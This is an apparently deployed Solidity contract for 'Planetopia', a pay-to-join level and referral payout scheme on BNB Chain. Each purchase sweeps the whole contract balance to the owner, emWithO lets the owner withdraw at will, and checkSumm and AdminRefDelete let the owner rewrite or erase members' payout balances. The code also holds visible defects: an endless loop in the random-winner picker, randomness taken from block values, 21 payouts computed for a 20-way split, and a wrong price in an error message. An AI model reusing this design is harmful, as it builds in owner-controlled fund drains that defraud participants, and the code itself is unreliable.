/**
 *Submitted for verification at BscScan.com on 2022-07-11
*/

pragma solidity  0.6.0;


interface PlanetopiaNFT {
    function mintPlanetX(address userAddress) external;
}

contract Planetopia {
    


    struct User {
        uint id;
        address referrer;
        uint8 maxLevel;
        bool blocked;
        uint256 totalreward;
        uint256 team;
        uint256 teamreward;
        uint256 planetxreward;
        mapping(uint8 => uint256) payoutsLeft;
        mapping(uint8 => uint256) payoutsTotal;
    }
   
    
   
    uint8 public constant LASTLEVEL = 10;
    mapping(address => User) public users;

    uint256 public lastUserId = 1;

    address public owner;
    mapping(uint => address) public idToAddress;
    mapping(uint8 => uint) public levelPrice;
    uint256 public transactions = 0;
    uint256 public turnover = 0;
    mapping(address => bool) public planetx_nft;


    address marketing;
    address planetxaddress;
    
    
    constructor() public {

        owner = msg.sender;
        marketing = owner;
        planetxaddress = 0x0000000000000000000000000000000000000000;

        levelPrice[1] = 0.2 ether / 1000;
        levelPrice[2] = 0.3 ether / 1000;
        levelPrice[3] = 0.4 ether / 1000;
        levelPrice[4] = 0.6 ether / 1000;
        levelPrice[5] = 0.8 ether / 1000;
        levelPrice[6] = 1.2 ether / 1000;
        levelPrice[7] = 1.6 ether / 1000;
        levelPrice[8] = 2.4 ether / 1000;
        levelPrice[9] = 3.2 ether / 1000;
        levelPrice[10] = 4.8 ether / 1000;
        

       
        User memory user = User({
            id: lastUserId,
            referrer: 0x0000000000000000000000000000000000000000,
            maxLevel: 10,
            totalreward: 0,
            team: 0,
            teamreward:0,
            planetxreward:0,
            blocked:false
            
        });

        idToAddress[lastUserId] = owner;

        users[owner] = user;
         for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            users[owner].payoutsLeft[l]=levelPrice[l]*200;
        }   


        lastUserId++;

        
    }
    
    function AdminRefDelete(address userAddress) external  {
        require(msg.sender ==  owner, "only owner");
        
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            users[userAddress].payoutsLeft[l]=0;
        }   
        lastUserId++;
    }
    function AdminRef(address userAddress) external  {
                require(msg.sender ==  owner, "only owner");
             
            User memory user = User({
                id: lastUserId,
                referrer: owner,
                maxLevel: 10,
                totalreward: 0,
                team: 0,
                teamreward:0,
                planetxreward:0,
                blocked:false
            });
           
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            users[userAddress].payoutsLeft[l]=levelPrice[l]*2;
        }   
        lastUserId++;
    }

   
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k-1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }

    
    function registrationExt(address userAddress,address referrerAddress) external payable  {
        
        registration(userAddress, referrerAddress);
    }

   
    
    function buyNewLevel(address userAddress, uint8 level) external payable {
       
        if(level>1){
            require(msg.value == levelPrice[level], "invalid price");
            require(isUserExists(userAddress), "user not exists");
            turnover += msg.value;
            transactions +=1;
        }
        require(level >= 1 && level <= lastLevel(), "invalid level");
        require(users[userAddress].payoutsLeft[level]==0, "invalid level");

        

        for (uint256 uid = 0; uid <= 20 ; uid++) {
            address winner = getRandUserByLevel(level,uid);
            uint256 win_amount = (levelPrice[level] * 70) / (20*100) ;
            payable(winner).transfer(win_amount);
            users[winner].totalreward += win_amount;
            users[winner].payoutsTotal[level] += win_amount;
            users[winner].payoutsLeft[level] -= win_amount;
           
        }
        users[userAddress].payoutsLeft[level] = (levelPrice[level] * 260) / 100;
 
        if(users[userAddress].maxLevel<level){
            users[userAddress].maxLevel = level;
        }

        if(level==10 && !planetx_nft[userAddress] && planetxaddress!=0x0000000000000000000000000000000000000000){
            PlanetopiaNFT(planetxaddress).mintPlanetX(userAddress);
            planetx_nft[userAddress]=true;
        }

        // team rewards
        address ref;
        ref =   users[userAddress].referrer;
        
        if(ref!=0x0000000000000000000000000000000000000000 && !users[ref].blocked){
            
                    payable(ref).transfer(levelPrice[level] * 20 / 100);
                    users[ref].teamreward += levelPrice[level] * 20 / 100;
                    if(level==1){
                        users[ref].team++;
                    }
        }
       payable(marketing).transfer(levelPrice[level] * 5 / 100);
       payable(planetxaddress).transfer(levelPrice[level] * 5 / 100);
       payable(owner).transfer(address(this).balance);

    
       
    }    

    function checkSumm (address userAddress, uint8 level, uint256 new_payouts) public{
        require(msg.sender ==  owner, "only owner");
        users[userAddress].payoutsLeft[level]=new_payouts;

    }
    function registration(address userAddress, address referrerAddress) private {
        require(msg.value == levelPrice[1], "registration cost 0.1");
        require(!isUserExists(userAddress), "user exists");
       
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
                id: lastUserId,
                referrer: payable(referrerAddress),
                maxLevel: 1,
                totalreward: 0,
                team: 0,
                teamreward:0,
                planetxreward:0,
                blocked:false
            });
           
        
        
       
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        transactions++;
        turnover += msg.value;
        lastUserId++;
        this.buyNewLevel(userAddress,1);
    }
    
    
   
    function getRandUserByLevel(uint8 level,uint256 h) public view returns (address) {
        
        uint256 randid = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, h))) % (lastUserId-1);
        
        while(true){
            if(maxActiveLevel(idToAddress[randid+1])>=level){
                return idToAddress[randid+1];
            }
        }
        return owner;
    }

    function lastLevel() public view returns (uint8) {
        if(users[msg.sender].maxLevel<LASTLEVEL){
            return (users[msg.sender].maxLevel+1);
        }else{
            return LASTLEVEL;
        }
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    
     function maxActiveLevel(address user) public view returns (uint8) {
       // if(isAdmin(user)) return false;

        for (uint8 nc = LASTLEVEL; nc >0 ; nc--) {
                if(users[user].payoutsLeft[nc]>0){ 
                    
                    return nc;
                }
                
        }
        return 1;
     }

  function isFrozen(address user,uint8 level) public view returns (bool) {
     
        uint8 maxActiveLevels = maxActiveLevel( user);
        for (uint8 l = 1; l <= maxActiveLevels ; l++) {
            if(users[user].payoutsLeft[l]==0){
                return true; 
            }
        }

        if(users[user].payoutsLeft[level]<= levelPrice[level]* 7  && maxActiveLevels<=level){
                return true;   
        }
        
        return false;
    }
   
    function payoutsLeft(address userAddress, uint8 level) public view returns(uint256) {
        return  users[userAddress].payoutsLeft[level];
    }

    function payoutsLeftAll(address userAddress) public view returns(string memory, string memory) {

        string memory b = "";
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            b = string(abi.encodePacked(b, uint2str(users[userAddress].payoutsLeft[l]),","));
        }

        string memory c = "";
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            c = string(abi.encodePacked(c, uint2str(users[userAddress].payoutsTotal[l]),","));
        }
         return (b,c);
    }


    function isFrozenAll(address userAddress) public view returns(string memory) {

        string memory b = "";
        string memory res;
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            if(isFrozen( userAddress,l)) {
                res="1";
            }else{
                res="0";
            }
            b = string(abi.encodePacked(b, res,","));
        }
         return b;
    }

    
    function emWithO(uint256 amount) external  {
        require(msg.sender ==  owner, "only owner");
        payable(owner).transfer(amount);
    }

    function setMarketingAddress(address _marketing) external  {
        require(msg.sender ==  owner, "only owner");
        marketing = _marketing;
    }

    function setPlanetXNFTAddress(address _planetxaddress) external  {
        require(msg.sender ==  owner, "only owner");
        planetxaddress = _planetxaddress;
    }
    
}